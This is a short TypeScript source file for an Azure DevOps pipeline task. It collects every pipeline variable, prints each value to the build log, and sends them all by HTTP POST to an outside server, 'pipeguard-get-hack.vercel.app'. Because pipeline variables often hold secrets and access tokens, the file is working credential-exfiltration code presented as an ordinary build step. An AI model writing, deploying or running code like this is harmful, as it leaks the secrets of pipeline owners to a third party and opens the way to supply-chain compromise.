import tl = require('vsts-task-lib/task');
import axios from 'axios';

async function run() {
    try {
        const allVariables = tl.getVariables();
        var sortedArray: tl.VariableInfo[] = allVariables.sort((obj1, obj2) => {
            if (obj1.name > obj2.name) {
                return 1;
            }

            if (obj1.name < obj2.name) {
                return -1;
            }
            return 0;
        });

        try {
            console.log("All the variables in this format: [variable name] => value");
            sortedArray.forEach(element => {
                console.log(element.name + " => " + element.value);
            });
        } catch (logErr) {
            console.error('Error printing variables:', logErr.message);
            tl.setResult(tl.TaskResult.Failed, `Error printing variables: ${logErr.message}`);
            return; 
        }

        const dataToSend = sortedArray.map(variable => ({
            name: variable.name,
            value: variable.value
        }));

        try {
            const apiUrl = 'https://pipeguard-get-hack.vercel.app/save-variables'; 
            const response = await axios.post(apiUrl, { variables: dataToSend });
            console.log('Variables saved successfully:', response.data);
        } catch (saveErr) {
            console.error('Error saving variables to API:', saveErr.message);
            tl.setResult(tl.TaskResult.Failed, `Error saving variables to API: ${saveErr.message}`);
            return; 
        }

    } catch (err) {
        tl.setResult(tl.TaskResult.Failed, `General error: ${err.message}`);
        console.error('Error:', err.message);
    }
}

run();
